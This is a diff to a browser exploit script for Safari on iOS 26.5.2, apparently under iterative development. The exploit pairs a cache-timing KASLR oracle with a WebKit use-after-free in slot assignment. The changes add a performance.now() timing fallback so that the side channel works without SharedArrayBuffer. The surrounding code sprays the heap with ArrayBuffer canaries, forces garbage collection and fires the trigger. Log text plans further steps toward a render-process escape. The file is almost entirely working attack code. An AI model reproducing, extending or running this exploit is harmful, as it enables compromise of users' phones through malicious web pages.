@@ -332,10 +332,20 @@ function buildChase(sizeBytes) {
   return { arr, entries };
 }
 
+// v68: when USE_PERF_NOW=true, Safari's 1ms clock quantizes sub-ms runs to 0.
+// Fix: inflate STEPS so a single chase call takes >2ms → non-zero reading guaranteed.
+// Hot (4KB, L1-resident) at 5ns/step needs 400k steps for 2ms.
+// Cold (32MB, DRAM) at 130ns/step needs ~16k steps for 2ms.
+// We use STEPS_PERF_HOT=500000 and STEPS_PERF_COLD=20000 in perf.now() mode.
+const STEPS_PERF_HOT  = 500000;
+const STEPS_PERF_COLD = 20000;
+
 function chaseTime(arr, startIdx, steps) {
   const t0 = rdcnt();
   let idx = startIdx;
-  for (let i = 0; i < steps; i++) idx = arr[idx * 16];
+  // In perf.now() mode, wrap pointer with modulo to avoid stepping off end of small arrays
+  const len = arr.length / 16 | 0;
+  for (let i = 0; i < steps; i++) idx = arr[(idx % len) * 16];
   return (rdcnt() - t0 + (idx & 0)) / steps;
 }
 
@@ -377,11 +387,14 @@ async function t2() {
   const hot  = buildChase(4*1024);
   const cold = buildChase(32*1024*1024);
   await new Promise(r=>setTimeout(r,50));
-  const STEPS=64, REPS=40;
+  // v68: inflate STEPS in perf.now() mode so each call takes >2ms (beats 1ms quantization)
+  const STEPS     = USE_PERF_NOW ? STEPS_PERF_COLD : 64;
+  const STEPS_HOT = USE_PERF_NOW ? STEPS_PERF_HOT  : 64;
+  const REPS=40;
   let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
   const hotT=[], coldT=[];
   for(let r=0;r<REPS;r++){
-    hotT.push(chaseTime(hot.arr,0,STEPS));
+    hotT.push(chaseTime(hot.arr,0,STEPS_HOT));
     coldT.push(chaseTime(cold.arr,r%cold.entries,STEPS));
   }
   hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
@@ -1149,13 +1162,13 @@ async function runOracle() {
     const dramRatio=t2Result ? t2Result.dramNS/Math.max(t2Result.hotNS,0.1) : 0;
     if(!t2Result || t2Result.dramNS < 30 || dramRatio < 3){
       log(`[!] GATE1 FAIL: DRAM ratio=${dramRatio.toFixed(1)}x < 3x or dramNS=${t2Result?.dramNS?.toFixed(0)||0}ns < 30ns — no signal, retrying`);
-      counterWorker.terminate(); counterWorker=null;
+      if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
       continue;
     }
     log(`[*] GATE1 PASS: DRAM ratio=${dramRatio.toFixed(1)}x`);
 
     const jitData=await t3();
-    if(!jitData){ counterWorker.terminate(); counterWorker=null; continue; }
+    if(!jitData){ if(counterWorker){ counterWorker.terminate(); counterWorker=null; } continue; }
     await new Promise(r=>setTimeout(r,30));
 
     // SLC flush between T3 and T4: T3 pins 90+ JIT modules in SLC (~14MB).
@@ -1176,7 +1189,7 @@ async function runOracle() {
     const clusterCount=heapData.clusters.length;
     if(clusterCount < 2){
       log(`[!] GATE2 FAIL: T4 clusters=${clusterCount} < 2 — retrying`);
-      counterWorker.terminate(); counterWorker=null;
+      if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
       continue;
     }
     log(`[*] GATE2 PASS: T4 clusters=${clusterCount} (need ≥2)`);
@@ -1187,7 +1200,7 @@ async function runOracle() {
     // GATE 3: leaked bits
     if(entropyData.totalLeaked < 9){
       log(`[!] GATE3 FAIL: leaked=${entropyData.totalLeaked} bits < 9 (${2**entropyData.remaining} candidates) — retrying`);
-      counterWorker.terminate(); counterWorker=null;
+      if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
       continue;
     }
     log(`[*] GATE3 PASS: ${entropyData.totalLeaked} bits leaked → ${2**entropyData.remaining} candidates`);
@@ -1204,7 +1217,7 @@ async function runOracle() {
 
     const oracleOut = await t10(jitData,heapData,bankData,offsetData,entropyData);
 
-    counterWorker.terminate(); counterWorker=null;
+    if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
 
     const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
     log(`\n=== ORACLE DONE (attempt ${attempt}) — [!!!]: ${hits.length} ===`);
@@ -1956,7 +1969,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
 
 (async () => {
-  log('=== WebKit UAF + KASLR v66 (DUAL CANARY: g=2 slotchange re-entrant + g=4 384B size class) ===');
+  log('=== WebKit UAF + KASLR v68 (DUAL CANARY: g=2 slotchange re-entrant + g=4 384B size class) ===');
   log('=== Target: iOS 26.5.2 / safari-7625.1.29.11 / A16 arm64e ===');
   log('=== UAF: ManualSlotAssignment WeakHashMap rehash (rdar://179729192) ===\n');
 
@@ -2047,8 +2060,8 @@ function checkNodeLeak(nodes, expectedNode) {
   } catch(_) { _v52RetryState = null; }
 
   if (!self.SharedArrayBuffer) {
-    log('[!] SharedArrayBuffer unavailable — need COOP/COEP headers or file:// with flags');
-    return;
+    log('[!] SAB unavailable — performance.now() fallback active (v68), continuing without SAB');
+    // DO NOT return — startCounter() will set USE_PERF_NOW=true and oracle proceeds
   }
 
   // ── v53: fast path — skip oracle + phases 1-5 when resuming auto-retry ────
@@ -2745,12 +2758,12 @@ function checkNodeLeak(nodes, expectedNode) {
   log('[*]   SHRINK fires (injected=true confirmed). Canary saturated 192B LIFO. Page survived.');
   log('[*]   → Compiler CSE or binary code restructure eliminated the stale read on 26.5.2 release build.');
   log('[*]   → Also: two ReferenceError bugs in summary block fixed (scope leak: _p6bCandToTry, p6InjCount).');
-  log('[*] v66 ROOT CAUSE OF v65 FAILURE:');
+  log('[*] v68 ROOT CAUSE OF v65 FAILURE:');
   log('[*]   The effectiveCurrent raw ptr read in slotManualAssignmentDidChange does not execute.');
   log('[*]   v65 canary test is definitive: 16384×192B DEADBEEF canaries on 192B LIFO, injected=true,');
   log('[*]   yet process survived. The specific stale-read at that C++ site is compiler-eliminated.');
   log('[*]   Need a DIFFERENT C++ code path that reads through m_slots after the bucket is freed.');
-  log('[*] v66 DUAL CANARY STRATEGY:');
+  log('[*] v68 DUAL CANARY STRATEGY:');
   log('[*]   PROBE A (g=2, 192B): slotchange re-entrant call — JS slotchange handler fires synchronously');
   log('[*]     during assign(). Handler calls slot.assignedNodes() → internal C++ traversal of m_slots.');
   log('[*]     If assignedNodes() iterates the OLD bucket (stale ptr) after SHRINK → reads freed memory.');
@@ -2763,7 +2776,7 @@ function checkNodeLeak(nodes, expectedNode) {
   log('[*]     384B is a different bmalloc size class than 192B. Different SHRINK code path.');
   log('[*]     If the stale read is present in the g=4 SHRINK variant → crash at 0xDEADBEEFDEADBEEF.');
   log('[*]     Canary: 16384×384B ArrayBuffer with 0xDEADBEEFDEADBEEF at bytes[0..7].');
-  log('[*] v66 changes:');
+  log('[*] v68 changes:');
   log('[*]   1. Fix two scope bugs: _p6bCandToTry stub hoisted, summary ref fixed (was: ReferenceError)');
   log('[*]   2. PROBE A: g=2 uafSetup + slotchange re-entrant assignedNodes() call during trigger');
   log('[*]      slotchange handler added BEFORE armTrigger, calls slot.assignedNodes() synchronously');
@@ -3243,9 +3256,9 @@ function checkNodeLeak(nodes, expectedNode) {
     //   Probe A (g=2, 192B): slotchange re-entrant assignedNodes() call during SHRINK
     //   Probe B (g=4, 384B): different size class / code path entirely
     // v66: DUAL CANARY PROBE IMPLEMENTATION
-    log('[P6B] v66: DUAL CANARY — Probe A (g=2 re-entrant slotchange) + Probe B (g=4 384B)');
-    log('[P6B] v66: Probe A tests slotchange re-entrant assignedNodes() C++ path during SHRINK');
-    log('[P6B] v66: Probe B tests g=4 size class (384B freed bucket) — different code path');
+    log('[P6B] v68: DUAL CANARY — Probe A (g=2 re-entrant slotchange) + Probe B (g=4 384B)');
+    log('[P6B] v68: Probe A tests slotchange re-entrant assignedNodes() C++ path during SHRINK');
+    log('[P6B] v68: Probe B tests g=4 size class (384B freed bucket) — different code path');
     log('[P6B] v65: If NO crash → deref path dead on this iOS 26.5.2 build → different primitive needed');
     log('');
 
@@ -3275,29 +3288,29 @@ function checkNodeLeak(nodes, expectedNode) {
     // Canary: 16384×384B ArrayBuffer with 0xDEADBEEFDEADBEEF at bytes[0..7].
 
     // ── PROBE A ──────────────────────────────────────────────────────────────────
-    log('[P6B v66] ── PROBE A: g=2 (192B) + slotchange re-entrant assignedNodes() ──');
+    log('[P6B v68] ── PROBE A: g=2 (192B) + slotchange re-entrant assignedNodes() ──');
     {
-      log('[P6B v66-A] Building uafSetup(2)...');
+      log('[P6B v68-A] Building uafSetup(2)...');
       const _cvA = uafSetup(2);
       await new Promise(r => setTimeout(r, 0));
 
-      log('[P6B v66-A] Releasing ghosts...');
+      log('[P6B v68-A] Releasing ghosts...');
       _cvA.releaseGhosts();
       await new Promise(r => setTimeout(r, 0));
 
       // GC confirmed-dead
       const _cvAGCTarget = _cvA.ghosts;
       const _cvAGetDead = () => _cvA.getGhostDeadCount();
-      log(`[P6B v66-A] GC wait — target ${_cvAGCTarget} ghosts...`);
+      log(`[P6B v68-A] GC wait — target ${_cvAGCTarget} ghosts...`);
       const _cvAGcStart = Date.now();
       let _cvAGcRound = 0;
       while (_cvAGetDead() < _cvAGCTarget) {
-        if (Date.now() - _cvAGcStart > 45000) { log('[P6B v66-A] GC TIMEOUT'); break; }
+        if (Date.now() - _cvAGcStart > 45000) { log('[P6B v68-A] GC TIMEOUT'); break; }
         await hardForceGC(`v66-A round ${++_cvAGcRound} (dead=${_cvAGetDead()}/${_cvAGCTarget})`);
         await new Promise(r => setTimeout(r, 400));
         document.body.offsetHeight;
       }
-      log(`[P6B v66-A] GC done — ${_cvAGetDead()}/${_cvAGCTarget} dead (${_cvAGcRound} rounds)`);
+      log(`[P6B v68-A] GC done — ${_cvAGetDead()}/${_cvAGCTarget} dead (${_cvAGcRound} rounds)`);
       await hardForceGC('v66-A extra-round');
       await new Promise(r => setTimeout(r, 400));
       document.body.offsetHeight;
@@ -3305,7 +3318,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
       // Canary spray: 16384×192B
       const _cvA_COUNT = 16384, _cvA_SZ = 192;
-      log(`[P6B v66-A] Spraying ${_cvA_COUNT}×${_cvA_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
+      log(`[P6B v68-A] Spraying ${_cvA_COUNT}×${_cvA_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
       {
         const _cvABufs = [];
         for (let _i = 0; _i < _cvA_COUNT; _i++) {
@@ -3320,7 +3333,7 @@ function checkNodeLeak(nodes, expectedNode) {
       }
       await new Promise(r => setTimeout(r, 0));
       await new Promise(r => setTimeout(r, 0));
-      log('[P6B v66-A] 192B LIFO saturated with canaries');
+      log('[P6B v68-A] 192B LIFO saturated with canaries');
 
       // Register slotchange handler that calls assignedNodes() re-entrantly
       const { targetSlot: _cvASlot, childA: _cvAA, childB: _cvAB, pumpCount: _cvAPump } = _cvA;
@@ -3338,7 +3351,7 @@ function checkNodeLeak(nodes, expectedNode) {
         }
       };
       _cvASlot.addEventListener('slotchange', _cvAHandler);
-      log('[P6B v66-A] slotchange handler registered (re-entrant assignedNodes() call)');
+      log('[P6B v68-A] slotchange handler registered (re-entrant assignedNodes() call)');
 
       _cvA.armTrigger();
 
@@ -3354,7 +3367,7 @@ function checkNodeLeak(nodes, expectedNode) {
         }));
       } catch(_) {}
 
-      log('[P6B v66-A] FIRING TRIGGER → slotchange re-entrant assignedNodes() during SHRINK...');
+      log('[P6B v68-A] FIRING TRIGGER → slotchange re-entrant assignedNodes() during SHRINK...');
       let _cvAException = false, _cvAInjected = false;
       try {
         _cvASlot.assign(_cvAA); // TRIGGER
@@ -3369,50 +3382,50 @@ function checkNodeLeak(nodes, expectedNode) {
       try { _cvASlot.removeEventListener('slotchange', _cvAHandler); } catch(_) {}
 
       log('');
-      log('[P6B v66-A] ══════════════════════════════════════════════');
-      log(`[P6B v66-A] PROBE A RESULT: exception=${_cvAException}  injected=${_cvAInjected}  handlerFired=${_cvAHandlerFired}`);
-      log(`[P6B v66-A]   reentrantNodes=${_cvAReentrantNodes ? _cvAReentrantNodes.length : 'null'}  reentrantException=${_cvAReentrantException}`);
+      log('[P6B v68-A] ══════════════════════════════════════════════');
+      log(`[P6B v68-A] PROBE A RESULT: exception=${_cvAException}  injected=${_cvAInjected}  handlerFired=${_cvAHandlerFired}`);
+      log(`[P6B v68-A]   reentrantNodes=${_cvAReentrantNodes ? _cvAReentrantNodes.length : 'null'}  reentrantException=${_cvAReentrantException}`);
       if (_cvAException) {
         p6Crashes++;
-        log('[P6B v66-A] JS exception during trigger — check DOM setup, not a KERN_INVALID_ADDRESS');
+        log('[P6B v68-A] JS exception during trigger — check DOM setup, not a KERN_INVALID_ADDRESS');
       } else if (_cvAInjected) {
         p6InjCount++;
         p6NoCrashNoAnomaly++;
-        log('[P6B v66-A] SHRINK fired (injected=true) + re-entrant assignedNodes() ran — NO CRASH');
-        log('[P6B v66-A] re-entrant assignedNodes() path also does not produce stale deref on 26.5.2');
-        if (!_cvAHandlerFired) log('[P6B v66-A] ⚠ slotchange handler did NOT fire — re-entrant path not reached');
+        log('[P6B v68-A] SHRINK fired (injected=true) + re-entrant assignedNodes() ran — NO CRASH');
+        log('[P6B v68-A] re-entrant assignedNodes() path also does not produce stale deref on 26.5.2');
+        if (!_cvAHandlerFired) log('[P6B v68-A] ⚠ slotchange handler did NOT fire — re-entrant path not reached');
       } else {
         p6NoCrashNoAnomaly++;
-        log('[P6B v66-A] SHRINK did NOT fire (injected=false) — uafSetup g=2 threshold issue');
+        log('[P6B v68-A] SHRINK did NOT fire (injected=false) — uafSetup g=2 threshold issue');
       }
-      log('[P6B v66-A] ══════════════════════════════════════════════');
+      log('[P6B v68-A] ══════════════════════════════════════════════');
     }
 
     // ── PROBE B ──────────────────────────────────────────────────────────────────
     log('');
-    log('[P6B v66] ── PROBE B: g=4 (384B freed bucket, different size class) ──');
+    log('[P6B v68] ── PROBE B: g=4 (384B freed bucket, different size class) ──');
     {
-      log('[P6B v66-B] Building uafSetup(4)...');
+      log('[P6B v68-B] Building uafSetup(4)...');
       const _cvB = uafSetup(4);
       await new Promise(r => setTimeout(r, 0));
 
-      log('[P6B v66-B] Releasing ghosts...');
+      log('[P6B v68-B] Releasing ghosts...');
       _cvB.releaseGhosts();
       await new Promise(r => setTimeout(r, 0));
 
       // GC confirmed-dead
       const _cvBGCTarget = _cvB.ghosts;
       const _cvBGetDead = () => _cvB.getGhostDeadCount();
-      log(`[P6B v66-B] GC wait — target ${_cvBGCTarget} ghosts (g=4)...`);
+      log(`[P6B v68-B] GC wait — target ${_cvBGCTarget} ghosts (g=4)...`);
       const _cvBGcStart = Date.now();
       let _cvBGcRound = 0;
       while (_cvBGetDead() < _cvBGCTarget) {
-        if (Date.now() - _cvBGcStart > 45000) { log('[P6B v66-B] GC TIMEOUT'); break; }
+        if (Date.now() - _cvBGcStart > 45000) { log('[P6B v68-B] GC TIMEOUT'); break; }
         await hardForceGC(`v66-B round ${++_cvBGcRound} (dead=${_cvBGetDead()}/${_cvBGCTarget})`);
         await new Promise(r => setTimeout(r, 400));
         document.body.offsetHeight;
       }
-      log(`[P6B v66-B] GC done — ${_cvBGetDead()}/${_cvBGCTarget} dead (${_cvBGcRound} rounds)`);
+      log(`[P6B v68-B] GC done — ${_cvBGetDead()}/${_cvBGCTarget} dead (${_cvBGcRound} rounds)`);
       await hardForceGC('v66-B extra-round');
       await new Promise(r => setTimeout(r, 400));
       document.body.offsetHeight;
@@ -3420,7 +3433,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
       // Canary spray: 16384×384B (g=4 → cap=16 → freed oldBucket=16×24=384B)
       const _cvB_COUNT = 16384, _cvB_SZ = 384;
-      log(`[P6B v66-B] Spraying ${_cvB_COUNT}×${_cvB_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
+      log(`[P6B v68-B] Spraying ${_cvB_COUNT}×${_cvB_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
       {
         const _cvBBufs = [];
         for (let _i = 0; _i < _cvB_COUNT; _i++) {
@@ -3435,7 +3448,7 @@ function checkNodeLeak(nodes, expectedNode) {
       }
       await new Promise(r => setTimeout(r, 0));
       await new Promise(r => setTimeout(r, 0));
-      log('[P6B v66-B] 384B LIFO saturated with 0xDEADBEEFDEADBEEF canaries');
+      log('[P6B v68-B] 384B LIFO saturated with 0xDEADBEEFDEADBEEF canaries');
 
       const { targetSlot: _cvBSlot, childA: _cvBA, childB: _cvBB, pumpCount: _cvBPump } = _cvB;
       _cvB.armTrigger();
@@ -3452,9 +3465,9 @@ function checkNodeLeak(nodes, expectedNode) {
         }));
       } catch(_) {}
 
-      log('[P6B v66-B] FIRING TRIGGER: g=4 → SHRINK frees 384B bucket...');
-      log('[P6B v66-B] If deref executes: 0xDEADBEEFDEADBEEF → KERN_INVALID_ADDRESS → crash');
-      log('[P6B v66-B] If page survives: g=4 code path also dead on 26.5.2');
+      log('[P6B v68-B] FIRING TRIGGER: g=4 → SHRINK frees 384B bucket...');
+      log('[P6B v68-B] If deref executes: 0xDEADBEEFDEADBEEF → KERN_INVALID_ADDRESS → crash');
+      log('[P6B v68-B] If page survives: g=4 code path also dead on 26.5.2');
       let _cvBException = false, _cvBInjected = false;
       try {
         _cvBSlot.assign(_cvBA); // TRIGGER
@@ -3466,31 +3479,31 @@ function checkNodeLeak(nodes, expectedNode) {
       try { localStorage.removeItem(P6B_LS_KEY); } catch(_) {}
 
       log('');
-      log('[P6B v66-B] ══════════════════════════════════════════════');
-      log(`[P6B v66-B] PROBE B RESULT: exception=${_cvBException}  injected=${_cvBInjected}`);
+      log('[P6B v68-B] ══════════════════════════════════════════════');
+      log(`[P6B v68-B] PROBE B RESULT: exception=${_cvBException}  injected=${_cvBInjected}`);
       if (_cvBException) {
         p6Crashes++;
-        log('[P6B v66-B] JS exception — check DOM setup');
+        log('[P6B v68-B] JS exception — check DOM setup');
       } else if (_cvBInjected) {
         p6InjCount++;
         p6NoCrashNoAnomaly++;
-        log('[P6B v66-B] SHRINK fired (injected=true) BUT no crash');
-        log('[P6B v66-B] g=4 (384B) code path is also dead on iOS 26.5.2');
-        log('[P6B v66-B] COMBINED v65+v66 DIAGNOSIS:');
-        log('[P6B v66-B]   All tested stale-deref paths are dead on this build.');
-        log('[P6B v66-B]   Hypothesis B fully confirmed across multiple code paths.');
-        log('[P6B v66-B]   NEXT STEP OPTIONS:');
-        log('[P6B v66-B]   1. Binary audit: reverse slotManualAssignmentDidChange on 26.5.2 dyld shared cache');
-        log('[P6B v66-B]      → ipsw.me / dyld-shared-cache-extractor → ida/ghidra → find actual UAF site');
-        log('[P6B v66-B]   2. Different rdar: use a different WebKit bug from iOS 26.5.2 era');
-        log('[P6B v66-B]   3. Pivot to render-process escape via different slot-assignment race');
-        log('[P6B v66-B]      (mutation observer, TreeScope traversal during slot reassignment)');
+        log('[P6B v68-B] SHRINK fired (injected=true) BUT no crash');
+        log('[P6B v68-B] g=4 (384B) code path is also dead on iOS 26.5.2');
+        log('[P6B v68-B] COMBINED v65+v66 DIAGNOSIS:');
+        log('[P6B v68-B]   All tested stale-deref paths are dead on this build.');
+        log('[P6B v68-B]   Hypothesis B fully confirmed across multiple code paths.');
+        log('[P6B v68-B]   NEXT STEP OPTIONS:');
+        log('[P6B v68-B]   1. Binary audit: reverse slotManualAssignmentDidChange on 26.5.2 dyld shared cache');
+        log('[P6B v68-B]      → ipsw.me / dyld-shared-cache-extractor → ida/ghidra → find actual UAF site');
+        log('[P6B v68-B]   2. Different rdar: use a different WebKit bug from iOS 26.5.2 era');
+        log('[P6B v68-B]   3. Pivot to render-process escape via different slot-assignment race');
+        log('[P6B v68-B]      (mutation observer, TreeScope traversal during slot reassignment)');
       } else {
         p6NoCrashNoAnomaly++;
-        log('[P6B v66-B] SHRINK did NOT fire (injected=false) — uafSetup g=4 threshold issue');
-        log('[P6B v66-B] g=4: cap=16, threshold=8, pumpCount=3 — check opCount accumulation');
+        log('[P6B v68-B] SHRINK did NOT fire (injected=false) — uafSetup g=4 threshold issue');
+        log('[P6B v68-B] g=4: cap=16, threshold=8, pumpCount=3 — check opCount accumulation');
       }
-      log('[P6B v66-B] ══════════════════════════════════════════════');
+      log('[P6B v68-B] ══════════════════════════════════════════════');
     }
     // ── END DUAL PROBE ────────────────────────────────────────────────────────
 
